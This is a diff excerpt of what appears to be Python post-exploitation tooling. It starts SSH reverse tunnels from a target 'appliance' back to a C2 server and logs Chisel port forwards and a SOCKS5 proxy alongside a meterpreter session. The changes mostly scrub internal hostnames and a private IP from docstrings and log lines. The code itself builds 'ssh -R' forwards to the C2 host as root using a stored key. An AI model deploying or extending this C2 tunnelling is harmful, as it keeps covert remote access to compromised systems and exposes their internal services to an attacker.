@@ -145,19 +145,19 @@ def _kill_exec_thread(t):
 # ── SSH Reverse Tunnels ────────────────────────────────────────
 
 def _start_ssh_tunnels(c2_host, tunnel_cfg):
-    """Start SSH reverse tunnels from beretta back to c2-server.
+    """Start SSH reverse tunnels from appliance back to C2 server.
 
     SSH tunnels run independently of the meterpreter transport,
     providing reliable service access even when the single-threaded
     meterpreter command channel is under load.
 
     Args:
-        c2_host:    Grimlock hostname/IP (SSH destination)
+        c2_host:    C2 server hostname/IP (SSH destination)
         tunnel_cfg: Dict with keys:
-            key_path:  Path to SSH private key on beretta
+            key_path:  Path to SSH private key on the appliance
             forwards:  List of dicts with local_port, remote_port, remote_host
-            ssh_port:  SSH port on the C2 server (default 22)
-            ssh_user:  SSH user on the C2 server (default "root")
+            ssh_port:  SSH port on C2 server (default 22)
+            ssh_user:  SSH user on C2 server (default "root")
 
     Returns: subprocess.Popen handle or None on failure
     """
@@ -200,8 +200,7 @@ def _start_ssh_tunnels(c2_host, tunnel_cfg):
         "-i", key_path,
     ]
     for fwd in forwards:
-        # -R <c2-server_port>:<beretta_target_host>:<beretta_target_port>
-        remote_host = fwd.get("remote_host", "10.10.240.61")
+        remote_host = fwd.get("remote_host", "127.0.0.1")
         cmd += ["-R", "%d:%s:%d" % (
             fwd["local_port"], remote_host, fwd["remote_port"])]
     cmd.append("%s@%s" % (ssh_user, c2_host))
@@ -229,9 +228,9 @@ def _start_ssh_tunnels(c2_host, tunnel_cfg):
 
         _ssh_tunnel_proc = proc
         for fwd in forwards:
-            log.info("  SSH tunnel: c2-server:%d → %s:%d (pid=%d)",
+            log.info("  SSH tunnel: server:%d → %s:%d (pid=%d)",
                      fwd["local_port"],
-                     fwd.get("remote_host", "10.10.240.61"),
+                     fwd.get("remote_host", "127.0.0.1"),
                      fwd["remote_port"], proc.pid)
         return proc
     except FileNotFoundError:
@@ -459,12 +458,12 @@ def try_chisel(config):
 
         log.info("Chisel connected to %s (pid=%d)", server_url, proc.pid)
         for fwd in forwards:
-            log.info("  Chisel: c2-server:%d → %s:%d",
+            log.info("  Chisel: server:%d → %s:%d",
                      fwd["local_port"],
                      fwd.get("remote_host", "127.0.0.1"),
                      fwd["remote_port"])
         if socks_port:
-            log.info("  Chisel: c2-server:%d → SOCKS5 proxy", socks_port)
+            log.info("  Chisel: server:%d → SOCKS5 proxy", socks_port)
 
         return "chisel"
 
